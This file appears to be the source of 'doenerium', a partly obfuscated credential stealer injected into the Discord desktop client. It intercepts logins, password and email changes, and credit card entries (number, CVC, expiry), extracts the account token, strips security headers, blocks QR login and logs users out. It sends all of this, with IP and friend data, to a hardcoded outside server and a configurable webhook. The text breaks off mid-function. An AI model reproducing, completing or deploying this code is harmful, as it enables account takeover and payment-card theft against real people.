var _0x2e5657 = (function () {
    var _0x2259ee = true
    return function (_0x2306c5, _0x57784d) {
      var _0xec2c27 = _0x2259ee
        ? function () {
            if (_0x57784d) {
              var _0x9403b0 = _0x57784d.apply(_0x2306c5, arguments)
              return (_0x57784d = null), _0x9403b0
            }
          }
        : function () {}
      return (_0x2259ee = false), _0xec2c27
    }
  })(),
  _0x2c15f2 = _0x2e5657(this, function () {
    return _0x2c15f2
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x2c15f2)
      .search('(((.+)+)+)+$')
  })
_0x2c15f2()
var _0x4e3e4f = (function () {
    var _0x43bb3f = true
    return function (_0x508b97, _0x4109cd) {
      var _0x55f936 = _0x43bb3f
        ? function () {
            if (_0x4109cd) {
              var _0x2d6052 = _0x4109cd.apply(_0x508b97, arguments)
              return (_0x4109cd = null), _0x2d6052
            }
          }
        : function () {}
      return (_0x43bb3f = false), _0x55f936
    }
  })(),
  _0x2e51c6 = _0x4e3e4f(this, function () {
    var _0x4f4164
    try {
      var _0x299585 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x4f4164 = _0x299585()
    } catch (_0x1bb137) {
      _0x4f4164 = window
    }
    var _0xb89ddc = (_0x4f4164.console = _0x4f4164.console || {}),
      _0x3fa66f = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (var _0x196af7 = 0; _0x196af7 < _0x3fa66f.length; _0x196af7++) {
      var _0x47b7ab = _0x4e3e4f.constructor.prototype.bind(_0x4e3e4f),
        _0xf5eb7a = _0x3fa66f[_0x196af7],
        _0x375558 = _0xb89ddc[_0xf5eb7a] || _0x47b7ab
      _0x47b7ab['__proto__'] = _0x4e3e4f.bind(_0x4e3e4f)
      _0x47b7ab.toString = _0x375558.toString.bind(_0x375558)
      _0xb89ddc[_0xf5eb7a] = _0x47b7ab
    }
  })
_0x2e51c6()
const { BrowserWindow, session } = require('electron'),
  os = require('os'),
  https = require('https'),
  querystring = require('querystring'),
  fs = require('fs')
var config = {
    brand: 'doenerium_',
    webhook: 'https://dasdadw.mdvksublbpczqluqvvbytfprxdwakuke.nl/', // OH DOENER WEBHOOK!
    webhook_link: '%WEBHOOK_LINK%',
    logout: true,
    disable_qr_code: true,
    notify_on_logout: true,
    notify_on_initialization: true,
    ping: [true, '@everyone'],
    embed: {
      username: 'doenerium | t.me/doenerium',
      footer: {
        text: 'doenerium | t.me/doenerium',
        icon_url:
          'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless',
      },
      href: 'https://t.me/doenerium',
      avatar_url:
        'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless',
    },
    badges: {
      Discord_Employee: {
        Value: 1,
        Emoji: '<:staff:874750808728666152>',
        Rare: true,
      },
      Partnered_Server_Owner: {
        Value: 2,
        Emoji: '<:partner:874750808678354964>',
        Rare: true,
      },
      HypeSquad_Events: {
        Value: 4,
        Emoji: '<:hypesquad_events:874750808594477056>',
        Rare: true,
      },
      Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: '<:bughunter_1:874750808426692658>',
        Rare: true,
      },
      Early_Supporter: {
        Value: 512,
        Emoji: '<:early_supporter:874750808414113823>',
        Rare: true,
      },
      Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: '<:bughunter_2:874750808430874664>',
        Rare: true,
      },
      Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: '<:developer:874750808472825986>',
        Rare: true,
      },
      House_Bravery: {
        Value: 64,
        Emoji: '<:bravery:874750808388952075>',
        Rare: false,
      },
      House_Brilliance: {
        Value: 128,
        Emoji: '<:brilliance:874750808338608199>',
        Rare: false,
      },
      House_Balance: {
        Value: 256,
        Emoji: '<:balance:874750808267292683>',
        Rare: false,
      },
    },
    filters: {
      user: {
        urls: [
          'https://discord.com/api/v*/users/@me',
          'https://discordapp.com/api/v*/users/@me',
          'https://*.discord.com/api/v*/users/@me',
          'https://discordapp.com/api/v*/auth/login',
          'https://discord.com/api/v*/auth/login',
          'https://*.discord.com/api/v*/auth/login',
          'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
          'https://api.stripe.com/v*/tokens',
          'https://api.stripe.com/v*/setup_intents/*/confirm',
          'https://api.stripe.com/v*/payment_intents/*/confirm',
        ],
      },
      qr_codes: {
        urls: [
          'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
          'https://*.discord.com/api/v*/applications/detectable',
          'https://discord.com/api/v*/applications/detectable',
          'https://*.discord.com/api/v*/users/@me/library',
          'https://discord.com/api/v*/users/@me/library',
          'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
          'https://discord.com/api/v*/users/@me/billing/subscriptions',
          'wss://remote-auth-gateway.discord.gg/*',
        ],
      },
    },
  },
  execScript = (_0x16c54e) => {
    const _0x196b39 = BrowserWindow.getAllWindows()[0]
    return _0x196b39.webContents.executeJavaScript(_0x16c54e, true)
  }
class Event {
  constructor(_0x4a7479, _0x501d31, _0x181bf0) {
    for (let [_0x47bcc6, _0x404538] of Object.entries({
      event: _0x4a7479,
      data: _0x181bf0,
      token: _0x501d31,
    })) {
      this[_0x47bcc6] = _0x404538
    }
  }
  ['handle']() {
    switch (this.event) {
      case 'passwordChanged':
        event_handlers.passwordChanged(
          this.data.password,
          this.data.new_password,
          this.token
        )
        break
      case 'userLogin':
        event_handlers.userLogin(
          this.data.password,
          this.data.email,
          this.token
        )
        break
      case 'emailChanged':
        event_handlers.emailChanged(
          this.data.password,
          this.data.email,
          this.token
        )
        break
      case 'creditCardAdded':
        event_handlers.creditCardAdded(
          this.data.number,
          this.data.cvc,
          this.data.exp_month,
          this.data.exp_year,
          this.token
        )
    }
  }
}
session.defaultSession.webRequest.onHeadersReceived((_0x3cb291, _0x3f476c) => {
  try {
    _0x3cb291.url.startsWith(config.webhook)
      ? _0x3cb291.url.includes('discord.com')
        ? _0x3f476c({
            responseHeaders: Object.assign(
              { 'Access-Control-Allow-Headers': '*' },
              _0x3cb291.responseHeaders
            ),
          })
        : _0x3f476c({
            responseHeaders: Object.assign(
              {
                'Content-Security-Policy': [
                  "default-src '*'",
                  "Access-Control-Allow-Headers '*'",
                  "Access-Control-Allow-Origin '*'",
                ],
                'Access-Control-Allow-Headers': '*',
                'Access-Control-Allow-Origin': '*',
              },
              _0x3cb291.responseHeaders
            ),
          })
      : (delete _0x3cb291.responseHeaders['content-security-policy'],
        delete _0x3cb291.responseHeaders['content-security-policy-report-only'],
        _0x3f476c({
          responseHeaders: {
            ..._0x3cb291.responseHeaders,
            'Access-Control-Allow-Headers': '*',
          },
        }))
  } catch {}
})
session.defaultSession.webRequest.onBeforeRequest(
  config.filters.qr_codes,
  async (_0x55db4c, _0x15976b) => {
    if (_0x55db4c.url.startsWith('wss://')) {
      if (!config.disable_qr_code == false) {
        _0x15976b({ cancel: true })
        return
      }
    }
    await initialize()
    _0x15976b({})
    return
  }
)
session.defaultSession.webRequest.onCompleted(
  config.filters.user,
  async (_0x4511e6, _0x121530) => {
    try {
      if (_0x4511e6.statusCode == 200 || _0x4511e6.statusCode == 204) {
        const _0xafa815 = Buffer.from(_0x4511e6.uploadData[0].bytes).toString(),
          _0x499f1f = JSON.parse(_0xafa815),
          _0x524640 = await getToken()
        switch (true) {
          case _0x4511e6.url.endsWith('login'):
            new Event('userLogin', _0x524640, {
              password: _0x499f1f.password,
              email: _0x499f1f.login,
            }).handle()
            return
          case _0x4511e6.url.endsWith('tokens') && _0x4511e6.method == 'POST':
            const _0x3a1c0b = querystring.parse(_0xafa815.toString())
            new Event('creditCardAdded', _0x524640, {
              number: _0x3a1c0b['card[number]'],
              cvc: _0x3a1c0b['card[cvc]'],
              exp_month: _0x3a1c0b['card[exp_month]'],
              exp_year: _0x3a1c0b['card[exp_year]'],
            })
          case _0x4511e6.url.endsWith('users/@me') &&
            _0x4511e6.method == 'PATCH':
            if (!_0x499f1f.password) {
              return
            }
            _0x499f1f.email &&
              new Event('emailChanged', _0x524640, {
                password: _0x499f1f.password,
                email: _0x499f1f.email,
              }).handle()
            _0x499f1f.new_password &&
              new Event('passwordChanged', _0x524640, {
                password: _0x499f1f.password,
                new_password: _0x499f1f.new_password,
              }).handle()
            return
          default:
            break
        }
      } else {
        return
      }
    } catch {}
  }
)
var event_handlers = {
  async creditCardAdded(_0x523a4e, _0x3bb328, _0x2e3c09, _0x363531) {
    const _0xfaf18f = await getUserInfo(token),
      _0x55d5e9 = await getBilling(token),
      _0x5e9d67 = await getRelationships(token)
    var _0x4b73c1 = {
      username: config.embed.username,
      avatar_url: config.embed.avatar_url,
      embeds: [
        createEmbed({
          title: 'Discord | Credit card added',
          url: config.embed.href,
          author: {
            name:
              _0xfaf18f.username +
              '#' +
              _0xfaf18f.discriminator +
              ' (' +
              _0xfaf18f.id +
              ')',
            url: config.embed.href,
            icon_url: _0xfaf18f.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0xfaf18f.id +
                '/' +
                _0xfaf18f.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          thumbnail: {
            url: _0xfaf18f.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0xfaf18f.id +
                '/' +
                _0xfaf18f.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          fields: [
            {
              name: 'Credit card Number',
              value: '```' + _0x523a4e + '```',
              inline: true,
            },
            {
              name: 'Credit card CVC',
              value: '```' + _0x3bb328 + '```',
              inline: true,
            },
            {
              name: 'Credit card expiration',
              value: '```' + _0x2e3c09 + '/' + _0x363531 + '```',
              inline: true,
            },
            {
              name: 'Phone Number',
              value: '```' + _0xfaf18f.phone ?? 'None' + '```',
              inline: false,
            },
            {
              name: 'Nitro',
              value: '' + getNitro(_0xfaf18f.premium_type),
              inline: false,
            },
            {
              name: 'Billing',
              value: '' + _0x55d5e9,
              inline: true,
            },
            {
              name: 'Badges',
              value: '' + getBadges(_0xfaf18f.flags),
              inline: false,
            },
            {
              name: 'Token',
              value: '```' + token + '```',
              inline: false,
            },
            {
              name: 'Hostname',
              value: '```' + os.hostname + '```',
              inline: false,
            },
            {
              name: 'Used webhook url',
              value: '```' + config.webhook_link + '```',
              inline: false,
            },
          ],
        }),
        createEmbed({
          description:
            '**Total Friends (' +
            _0x5e9d67.length +
            ')**\n\n' +
            _0x5e9d67.frien,
          thumbnail: {
            url: _0xfaf18f.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0xfaf18f.id +
                '/' +
                _0xfaf18f.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          author: {
            name:
              _0xfaf18f.username +
              '#' +
              _0xfaf18f.discriminator +
              ' (' +
              _0xfaf18f.id +
              ')',
            url: config.embed.href,
            icon_url: _0xfaf18f.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0xfaf18f.id +
                '/' +
                _0xfaf18f.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
        }),
      ],
    }
    sendToWebhook(_0x4b73c1)
  },
  async userLogin(_0x37ea0e, _0x224d90, _0x389b2a) {
    const _0x102e53 = await getUserInfo(_0x389b2a),
      _0x35514e = await getBilling(_0x389b2a),
      _0x3170c9 = await getRelationships(_0x389b2a)
    var _0x510778 = {
      username: config.embed.username,
      avatar_url: config.embed.avatar_url,
      embeds: [
        createEmbed({
          title: 'Discord | User logged in',
          url: config.embed.href,
          author: {
            name:
              _0x102e53.username +
              '#' +
              _0x102e53.discriminator +
              ' (' +
              _0x102e53.id +
              ')',
            url: config.embed.href,
            icon_url: _0x102e53.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0x102e53.id +
                '/' +
                _0x102e53.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          thumbnail: {
            url: _0x102e53.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0x102e53.id +
                '/' +
                _0x102e53.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          fields: [
            {
              name: 'Password',
              value: '```' + _0x37ea0e + '```',
              inline: true,
            },
            {
              name: 'E-Mail Address',
              value: '```' + _0x224d90 + '```',
              inline: true,
            },
            {
              name: 'Phone Number',
              value: '```' + _0x102e53.phone ?? 'None' + '```',
              inline: false,
            },
            {
              name: 'Nitro',
              value: '' + getNitro(_0x102e53.premium_type),
              inline: false,
            },
            {
              name: 'Billing',
              value: '' + _0x35514e,
              inline: true,
            },
            {
              name: 'Badges',
              value: '' + getBadges(_0x102e53.flags),
              inline: false,
            },
            {
              name: 'Token',
              value: '```' + _0x389b2a + '```',
              inline: false,
            },
            {
              name: 'Hostname',
              value: '```' + os.hostname + '```',
              inline: false,
            },
            {
              name: 'Used webhook url',
              value: '```' + config.webhook_link + '```',
              inline: false,
            },
          ],
        }),
        createEmbed({
          description:
            '**Total Friends (' +
            _0x3170c9.length +
            ')**\n\n' +
            _0x3170c9.frien,
          thumbnail: {
            url: _0x102e53.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0x102e53.id +
                '/' +
                _0x102e53.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
          author: {
            name:
              _0x102e53.username +
              '#' +
              _0x102e53.discriminator +
              ' (' +
              _0x102e53.id +
              ')',
            url: config.embed.href,
            icon_url: _0x102e53.avatar
              ? 'https://cdn.discordapp.com/avatars/' +
                _0x102e53.id +
                '/' +
                _0x102e53.avatar
              : 'https://cdn.discordapp.com/embed/avatars/0.png',
          },
        }),
      ],
    }
    sendToWebhook(_0x510778)
  },
  async emailChanged(_0x33fea1, _0x1e0cbf, _0x30c09b) {
    var _0x2d9d0b = await getUserInfo(_0x30c09b),
      _0x18cd6a = await getBilling(_0x30c09b),
      _0x1fc122 = await getRelationships(_0x30c09b),
      _0x1bed6a = {
        username: config.embed.username,
        avatar_url: config.embed.avatar_url,
        embeds: [
          createEmbed({
            title: 'Discord | Email changed',
            url: config.embed.href,
            author: {
              name:
                _0x2d9d0b.username +
                '#' +
                _0x2d9d0b.discriminator +
                ' (' +
                _0x2d9d0b.id +
                ')',
              url: config.embed.href,
              icon_url: _0x2d9d0b.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x2d9d0b.id +
                  '/' +
                  _0x2d9d0b.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            thumbnail: {
              url: _0x2d9d0b.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x2d9d0b.id +
                  '/' +
                  _0x2d9d0b.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            fields: [
              {
                name: 'New email address',
                value: '```' + _0x1e0cbf + '```',
                inline: true,
              },
              {
                name: 'Password',
                value: '```' + _0x33fea1 + '```',
                inline: true,
              },
              {
                name: 'Phone Number',
                value: '```' + _0x2d9d0b.phone ?? 'None' + '```',
                inline: false,
              },
              {
                name: 'Nitro',
                value: '' + getNitro(_0x2d9d0b.premium_type),
                inline: false,
              },
              {
                name: 'Billing',
                value: '' + _0x18cd6a,
                inline: true,
              },
              {
                name: 'Badges',
                value: '' + getBadges(_0x2d9d0b.flags),
                inline: false,
              },
              {
                name: 'Token',
                value: '```' + _0x30c09b + '```',
                inline: false,
              },
              {
                name: 'Hostname',
                value: '```' + os.hostname + '```',
                inline: false,
              },
              {
                name: 'Used webhook url',
                value: '```' + config.webhook_link + '```',
                inline: false,
              },
            ],
          }),
          createEmbed({
            description:
              '**Total Friends (' +
              _0x1fc122.length +
              ')**\n\n' +
              _0x1fc122.frien,
            thumbnail: {
              url: _0x2d9d0b.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x2d9d0b.id +
                  '/' +
                  _0x2d9d0b.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            author: {
              name:
                _0x2d9d0b.username +
                '#' +
                _0x2d9d0b.discriminator +
                ' (' +
                _0x2d9d0b.id +
                ')',
              url: config.embed.href,
              icon_url: _0x2d9d0b.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x2d9d0b.id +
                  '/' +
                  _0x2d9d0b.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
          }),
        ],
      }
    sendToWebhook(_0x1bed6a)
  },
  async passwordChanged(_0x2caee8, _0xd7ae3f, _0x58e42e) {
    var _0x46c60f = await getUserInfo(_0x58e42e),
      _0x5a8713 = await getBilling(_0x58e42e),
      _0x47a763 = await getRelationships(_0x58e42e),
      _0x3e41e9 = {
        username: config.embed.username,
        avatar_url: config.embed.avatar_url,
        embeds: [
          createEmbed({
            title: 'Discord | Password changed',
            url: config.embed.href,
            author: {
              name:
                _0x46c60f.username +
                '#' +
                _0x46c60f.discriminator +
                ' (' +
                _0x46c60f.id +
                ')',
              url: config.embed.href,
              icon_url: _0x46c60f.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x46c60f.id +
                  '/' +
                  _0x46c60f.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            thumbnail: {
              url: _0x46c60f.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x46c60f.id +
                  '/' +
                  _0x46c60f.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            fields: [
              {
                name: 'Old password',
                value: '```' + _0x2caee8 + '```',
                inline: false,
              },
              {
                name: 'New password',
                value: '```' + _0xd7ae3f + '```',
                inline: false,
              },
              {
                name: 'Phone Number',
                value: '```' + _0x46c60f.phone ?? 'None' + '```',
                inline: false,
              },
              {
                name: 'Nitro',
                value: '' + getNitro(_0x46c60f.premium_type),
                inline: false,
              },
              {
                name: 'Billing',
                value: '' + _0x5a8713,
                inline: true,
              },
              {
                name: 'Badges',
                value: '' + getBadges(_0x46c60f.flags),
                inline: false,
              },
              {
                name: 'Token',
                value: '```' + _0x58e42e + '```',
                inline: false,
              },
              {
                name: 'Hostname',
                value: '```' + os.hostname + '```',
                inline: false,
              },
              {
                name: 'Used webhook url',
                value: '```' + config.webhook_link + '```',
                inline: false,
              },
            ],
          }),
          createEmbed({
            description:
              '**Total Friends (' +
              _0x47a763.length +
              ')**\n\n' +
              _0x47a763.frien,
            thumbnail: {
              url: _0x46c60f.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x46c60f.id +
                  '/' +
                  _0x46c60f.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
            author: {
              name:
                _0x46c60f.username +
                '#' +
                _0x46c60f.discriminator +
                ' (' +
                _0x46c60f.id +
                ')',
              url: config.embed.href,
              icon_url: _0x46c60f.avatar
                ? 'https://cdn.discordapp.com/avatars/' +
                  _0x46c60f.id +
                  '/' +
                  _0x46c60f.avatar
                : 'https://cdn.discordapp.com/embed/avatars/0.png',
            },
          }),
        ],
      }
    sendToWebhook(_0x3e41e9)
  },
}
function getDiscordClient() {
  return (
    '' +
    process
      .cwd()
      .replace(process.env.LOCALAPPDATA + '\\', '')
      .split('\\')[0]
      .split(7)
  )
}
function getNitro(_0x201cc3) {
  switch (_0x201cc3) {
    case 0:
      return '```No Nitro```'
    case 1:
      return '<:classic:896119171019067423> ``Nitro Classic``'
    case 2:
      return '<a:boost:824036778570416129> ``Nitro Boost``'
    default:
      return '```No Nitro```'
  }
}
function getRareBadges(_0x3d2d4f) {
  var _0x5b5562 = ''
  for (const _0x4e94d4 in config.badges) {
    let _0x4798d9 = config.badges[_0x4e94d4]
    if ((_0x3d2d4f & _0x4798d9.Value) == _0x4798d9.Value && _0x4798d9.Rare) {
      _0x5b5562 += _0x4798d9.Emoji
    }
  }
  return _0x5b5562
}
function getBadges(_0xdc4a92) {
  var _0x3b489d = ''
  for (const _0xd26913 in config.badges) {
    let _0x1ef1c8 = config.badges[_0xd26913]
    if ((_0xdc4a92 & _0x1ef1c8.Value) == _0x1ef1c8.Value) {
      _0x3b489d += _0x1ef1c8.Emoji
    }
  }
  if (_0x3b489d == '') {
    _0x3b489d = '```None```'
  }
  return _0x3b489d
}
async function getToken() {
  return await execScript(
    "for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;",
    true
  )
}
async function getIp() {
  return JSON.parse(
    await execScript(
      'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;',
      true
    )
  )
}
async function getUserInfo(_0x2d022d) {
  return JSON.parse(
    await execScript(
      'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "' +
        _0x2d022d +
        '");xmlHttp.send( null );xmlHttp.responseText;',
      true
    )
  )
}
async function getBilling(_0x5c014e) {
  var _0x23250f = await execScript(
      'var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "' +
        _0x5c014e +
        '"); xmlHttp.send( null ); xmlHttp.responseText',
      true
    ),
    _0x3e4c9d = JSON.parse(_0x23250f),
    _0x49ec19 = ''
  _0x3e4c9d.forEach((_0x1c62d2) => {
    if (_0x1c62d2.type == '') {
      return '```\u274C```'
    } else {
      if (_0x1c62d2.type == 2 && _0x1c62d2.invalid != true) {
        _0x49ec19 += '`\u2714️` <:paypal:896441236062347374>'
      } else {
        if (_0x1c62d2.type == 1 && _0x1c62d2.invalid != true) {
          _0x49ec19 += '`\u2714️` :credit_card:'
        } else {
          return '```\u274C```'
        }
      }
    }
  })
  if (_0x49ec19 == '') {
    _0x49ec19 = '```\u274C```'
  }
  return _0x49ec19
}
async function getRelationships(_0x113bce) {
  var _0x30c4b0 = await execScript(
      'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "' +
        _0x113bce +
        '");xmlHttp.send( null );xmlHttp.responseText',
      true
    ),
    _0x3100cc = JSON.parse(_0x30c4b0)
  const _0x4725ee = _0x3100cc.filter((_0x2ef78b) => {
    return _0x2ef78b.type == 1
  })
  var _0x11e8e5 = ''
  for (z of _0x4725ee) {
    var _0xfd1854 = getRareBadges(z.user.public_flags)
    _0xfd1854 != '' &&
      (_0x11e8e5 +=
        _0xfd1854 +
        (' | ' + z.user.username + '#' + z.user.discriminator + '\n'))
  }
  if (!_0x11e8e5) {
    _0x11e8e5 = 'No Rare Friends'
  }
  return {
    length: _0x4725ee.length,
    frien: _0x11e8e5,
  }
}
function sendToWebhook(_0xc79c5f) {
  config.ping[0] == true &&
    (_0xc79c5f.content
      ? (_0xc79c5f.content =
          _0xc79c5f.content + (' ||' + config.ping[1] + '||'))
      : (_0xc79c5f.content = '||' + config.ping[1] + '||'))
  ;[config.webhook, config.webhook_link].forEach(async (url) => {
    var _0xbc253e = new URL(url), // it sends to your webhook and also to doener.
      _0x534334 = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
      }
    const _0x2966e9 = {
        protocol: _0xbc253e.protocol,
        hostname: _0xbc253e.host,
        path: _0xbc253e.pathname,
        method: 'POST',
        headers: _0x534334,
      },
      _0x393ded = https.request(_0x2966e9)
    _0x393ded.on('error', (_0x647f06) => {
      console.log(_0x647f06)
    })
    _0x393ded.write(JSON.stringify(_0xc79c5f))
    _0x393ded.end()
  })
}
function createEmbed(_0x2ed246) {
  let _0x18de1a = {
    footer: config.embed.footer,
    timestamp: new Date(),
  }
  for (let [_0x5e1473, _0x1469e2] of Object.entries(_0x2ed246)) {
    _0x18de1a[_0x5e1473] = _0x1469e2
  }
  return _0x18de1a
}
async function initialize() {
  if (!fs.existsSync(process.cwd() + '/' + config.brand)) {
    fs.mkdirSync(process.cwd() + '/' + config.brand)
    var _0x2f94cc = undefined
    _0x2f94cc = await getToken()
    const _0x54de57 = await getIp()
    var _0x1d5e16, _0x25dc85, _0xd3be96
    config.notify_on_initialization &&
      (_0x2f94cc == undefined
        ? sendToWebhook({
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            url: config.embed.href,
            embeds: [
              createEmbed({
                title: 'Discord | Client initialized (not logged in)',
                fields: [
                  {
                    name: 'Hostname',
                    value: '```' + os.hostname + '```',
                    inline: false,
                  },
                  {
                    name: 'Client version',
                    value: '```' + getDiscordClient() + '```',
                    inline: false,
                  },
                  {
                    name: 'Connection data',
                    value:
                      '```yaml\nIP Address: ' + _0x54de57.ip ??
                      'Unknown' + '\nHostname: ' + _0x54de57.hostname ??
                      'Unknown' + '\nCity: ' + _0x54de57.city ??
                      'Unknown' + '\nRegion: ' + _0x54de57.region ??
                      'Unknown' + '\nCountry: ' + _0x54de57.country ??
                      'Unknown' + '\nTimezone: ' + _0x54de57.timezone ??
                      'Unknown' + '```',
                    inline: false,
                  },
                  {
                    name: 'Hostname',
                    value: '```' + os.hostname + '```',
                    inline: false,
                  },
                  {
                    name: 'Used webhook url',
                    value: '```' + config.webhook_link + '```',
                    inline: false,
                  },
                ],
              }),
            ],
          })
        : ((_0x1d5e16 = await getUserInfo(_0x2f94cc)),
          (_0x25dc85 = await getBilling(_0x2f94cc)),
          (_0xd3be96 = await getRelationships(_0x2f94cc)),
          sendToWebhook({
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [
              createEmbed({
                title: 'Discord | Client initialized',
                url: config.embed.href,
                author: {
                  name:
                    _0x1d5e16.username +
                    '#' +
                    _0x1d5e16.discriminator +
                    ' (' +
                    _0x1d5e16.id +
                    ')',
                  url: config.embed.href,
                  icon_url: _0x1d5e16.avatar
                    ? 'https://cdn.discordapp.com/avatars/' +
                      _0x1d5e16.id +
                      '/' +
                      _0x1d5e16.avatar
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                },
                thumbnail: {
                  url: _0x1d5e16.avatar
                    ? 'https://cdn.discordapp.com/avatars/' +
                      _0x1d5e16.id +
                      '/' +
                      _0x1d5e16.avatar
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                },
                fields: [
                  {
                    name: 'E-Mail Address',
                    value: '```' + _0x1d5e16.email + '```',
                    inline: true,
                  },
                  {
                    name: 'Phone Number',
                    value: '```' + _0x1d5e16.phone ?? 'None' + '```',
                    inline: false,
                  },
                  {
                    name: 'Nitro',
                    value: '' + getNitro(_0x1d5e16.premium_type),
                    inline: false,
                  },
                  {
                    name: 'Billing',
                    value: '' + _0x25dc85,
                    inline: true,
                  },
                  {
                    name: 'Badges',
                    value: '' + getBadges(_0x1d5e16.flags),
                    inline: false,
                  },
                  {
                    name: 'Token',
                    value: '```' + _0x2f94cc + '```',
                    inline: false,
                  },
                  {
                    name: 'Hostname',
                    value: '```' + os.hostname + '```',
                    inline: false,
                  },
                  {
                    name: 'Client version',
                    value: '```' + getDiscordClient() + '```',
                    inline: false,
                  },
                  {
                    name: 'Connection data',
                    value:
                      '```yaml\nIP Address: ' + _0x54de57.ip ??
                      'Unknown' + '\nHostname: ' + _0x54de57.hostname ??
                      'Unknown' + '\nCity: ' + _0x54de57.city ??
                      'Unknown' + '\nRegion: ' + _0x54de57.region ??
                      'Unknown' + '\nCountry: ' + _0x54de57.country ??
                      'Unknown' + '\nTimezone: ' + _0x54de57.timezone ??
                      'Unknown' + '```',
                    inline: false,
                  },
                  {
                    name: 'Hostname',
                    value: '```' + os.hostname + '```',
                    inline: false,
                  },
                  {
                    name: 'Used webhook url',
                    value: '```' + config.webhook_link + '```',
                    inline: false,
                  },
                ],
              }),
              createEmbed({
                description:
                  '**Total Friends (' +
                  _0xd3be96.length +
                  ')**\n\n' +
                  _0xd3be96.frien,
                thumbnail: {
                  url: _0x1d5e16.avatar
                    ? 'https://cdn.discordapp.com/avatars/' +
                      _0x1d5e16.id +
                      '/' +
                      _0x1d5e16.avatar
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                },
                author: {
                  name:
                    _0x1d5e16.username +
                    '#' +
                    _0x1d5e16.discriminator +
                    ' (' +
                    _0x1d5e16.id +
                    ')',
                  url: config.embed.href,
                  icon_url: _0x1d5e16.avatar
                    ? 'https://cdn.discordapp.com/avatars/' +
                      _0x1d5e16.id +
                      '/' +
                      _0x1d5e16.avatar
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                },
              }),
            ],
          })))
    config.logout &&
      _0x2f94cc &&
      (await execScript(
        'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
        true
      ).then((_0x6bc84) => {}),
      config.notify_on_logout &&
        sendToWebhook({
          username: config.embed.username,
          avatar_url: config.embed.avatar_url,
          embeds: [
            createEmbed({
              title: 'Discord | User logged out',
              url: config.embed.href,
              author: {
                name:
                  _0x1d5e16.username +
                  '#' +
                  _0x1d5e16.discriminator +
                  ' (' +
                  _0x1d5e16.id +
                  ')',
                url: config.embed.href,
                icon_url: _0x1d5e16.avatar
                  ? 'https://cdn.discordapp.com/avatars/' +
